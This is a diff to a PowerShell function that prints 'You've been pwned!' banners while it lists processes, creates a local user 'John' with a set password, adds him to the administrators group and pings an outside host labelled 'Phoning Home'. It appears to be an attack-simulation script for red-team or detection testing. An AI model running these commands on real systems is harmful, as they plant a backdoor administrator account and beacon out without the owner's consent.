@@ -1,6 +1,6 @@
 function Invoke-Tech
 {
-	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= You've been pwned! v6 =-=-=-=-=-=-=-=-=-=-=-=";
+	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= You've been pwned! v7 =-=-=-=-=-=-=-=-=-=-=-=";
 	Start-Sleep 1;
 	
 	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= EstablishiПg PersisteПce =-=-=-=-=-=-=-=-=-=-=-= ";
@@ -15,11 +15,15 @@ function Invoke-Tech
 	tasklist;
 	Start-Sleep 1;
 	
-	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= Adding Users          =-=-=-=-=-=-=-=-=-=-=-= ";
+	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= Adding User John      =-=-=-=-=-=-=-=-=-=-=-= ";
+	net user /add John SuperhardPassword3
+	Start-Sleep 1;
+	
+	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= Adding to Group       =-=-=-=-=-=-=-=-=-=-=-= ";
 	net localgroup administrators John /add
 	Start-Sleep 1;
 	
-	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= Phoning Home =-=-=-=-=-=-=-=-=-=-=-= ";
+	Write-Host "=-=-=-=-=-=-=-=-=-=-=-= Phoning Home          =-=-=-=-=-=-=-=-=-=-=-= ";
 	ping systemlowcheck.com -n 1
 	Start-Sleep 1;
 	
